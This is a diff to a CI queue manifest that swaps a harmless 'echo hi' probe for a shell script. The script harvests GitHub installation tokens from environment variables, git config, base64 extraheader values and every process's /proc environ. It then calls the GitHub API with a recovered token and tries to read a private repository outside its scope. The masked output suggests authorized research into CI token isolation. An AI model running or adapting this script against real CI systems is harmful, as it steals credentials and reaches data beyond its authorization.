@@ -1,5 +1,97 @@
-# StarSling CI manifest - benign probe queue
 [[queues]]
-name = "probe-alpha"
-commands = ["echo hi"]
-timeout_sec = 120
+name = "probe-env"
+timeout_sec = 240
+commands = [
+'''
+set -u
+pwd
+{
+  echo "=== env ==="
+  env
+  echo "=== gitconfig-file ==="
+  cat .git/config
+  echo "=== gitconfig-list ==="
+  git config --list --show-origin
+  echo "=== find ==="
+  find / -name config -path '*.git*' -type f
+  echo "=== run ==="
+  ls -laR /run/starsling
+  echo "=== proc ==="
+  for f in /proc/[0-9]*/environ; do tr '\0' '\n' < "$f" 2>/dev/null; done
+  echo "=== ps ==="
+  ps -ef
+} > /tmp/probe_all.txt 2>/dev/null
+
+echo "=== ghs_ candidates per source (masked) ==="
+awk '
+  /^=== / { src=$2; next }
+  {
+    line=$0
+    while (match(line, /ghs_[A-Za-z0-9]{20,}/)) {
+      print src, substr(line, RSTART, RLENGTH)
+      line = substr(line, RSTART+RLENGTH)
+    }
+  }
+' /tmp/probe_all.txt | sort -u | while IFS= read -r src tok; do
+  pfx=$(printf '%s' "$tok" | cut -c1-8)
+  ln=$(printf '%s' "$tok" | wc -c)
+  sha=$(printf '%s' "$tok" | sha256sum 2>/dev/null | cut -d' ' -f1)
+  echo "source=$src prefix=$pfx len=$ln sha256=$sha"
+done
+
+echo "=== keyword lines (masked) ==="
+grep -iE 'token|authorization|x-access-token|extraheader' /tmp/probe_all.txt \
+  | sed -E 's/ghs_[A-Za-z0-9]{20,}/ghs_[MASKED]/g; s/[A-Za-z0-9+\\/=]{40,}/[B64-MASKED]/g' \
+  | sort -u | head -60
+
+echo "=== extraheader/base64 decode check ==="
+grep -iE 'extraheader' /tmp/probe_all.txt | grep -oE '[A-Za-z0-9+/=]{40,}' | sort -u | while IFS= read -r b; do
+  dec=$(printf '%s' "$b" | base64 -d 2>/dev/null | grep -oE 'ghs_[A-Za-z0-9]{20,}' | head -1)
+  if [ -n "$dec" ]; then
+    dpfx=$(printf '%s' "$dec" | cut -c1-8)
+    dln=$(printf '%s' "$dec" | wc -c)
+    dsha=$(printf '%s' "$dec" | sha256sum 2>/dev/null | cut -d' ' -f1)
+    echo "extraheader-b64 ghs_ prefix=$dpfx len=$dln sha256=$dsha"
+  fi
+done
+
+TOK=$(grep -oE 'ghs_[A-Za-z0-9]{20,}' /tmp/probe_all.txt | sort -u | head -1)
+if [ -z "$TOK" ]; then
+  TOK=$(grep -iE 'extraheader' /tmp/probe_all.txt | grep -oE '[A-Za-z0-9+/=]{40,}' | sort -u \
+    | while IFS= read -r b; do printf '%s' "$b" | base64 -d 2>/dev/null; done \
+    | grep -oE 'ghs_[A-Za-z0-9]{20,}' | head -1)
+  [ -n "$TOK" ] && echo "candidate recovered from extraheader base64"
+fi
+
+if [ -n "$TOK" ]; then
+  pfx=$(printf '%s' "$TOK" | cut -c1-8)
+  sha=$(printf '%s' "$TOK" | sha256sum 2>/dev/null | cut -d' ' -f1)
+  echo "=== live token test (masked) ==="
+  echo "testing token prefix=$pfx sha256=$sha"
+  res=$(curl -s --max-time 20 -o /tmp/inst.json -w '%{http_code} %{time_total}' \
+    -H "Authorization: Bearer $TOK" -H "Accept: application/vnd.github+json" \
+    https://api.github.com/installation/repositories)
+  c1=${res%% *}
+  t1=${res##* }
+  tc=$(grep -o '"total_count":[0-9]*' /tmp/inst.json | head -1 | grep -o '[0-9]*')
+  echo "installation/repositories status=$c1 time=${t1}s total_count=${tc:-n/a}"
+  res=$(curl -s --max-time 20 -o /dev/null -w '%{http_code} %{time_total}' \
+    -H "Authorization: Bearer ghs_INVALID_CONTROL_TOKEN_0000000000" \
+    https://api.github.com/installation/repositories)
+  echo "garbage-token control status=${res%% *} time=${res##* }s (expect 401)"
+  if [ "$c1" = "200" ]; then
+    res=$(curl -s --max-time 20 -o /tmp/xs.json -w '%{http_code} %{time_total}' \
+      -H "Authorization: Bearer $TOK" \
+      https://api.github.com/repos/starsling-test-482917/ci-check-cross-scope-02f9a158/contents/README.md)
+    echo "private-repo README with-token status=${res%% *} time=${res##* }s"
+    res=$(curl -s --max-time 20 -o /dev/null -w '%{http_code} %{time_total}' \
+      https://api.github.com/repos/starsling-test-482917/ci-check-cross-scope-02f9a158/contents/README.md)
+    echo "private-repo README unauthenticated status=${res%% *} time=${res##* }s (expect 404)"
+  fi
+else
+  echo "=== live token test skipped: no ghs_ candidate found ==="
+fi
+rm -f /tmp/probe_all.txt /tmp/inst.json /tmp/xs.json
+echo "=== probe done $(date -u +%FT%TZ) ==="
+'''
+]
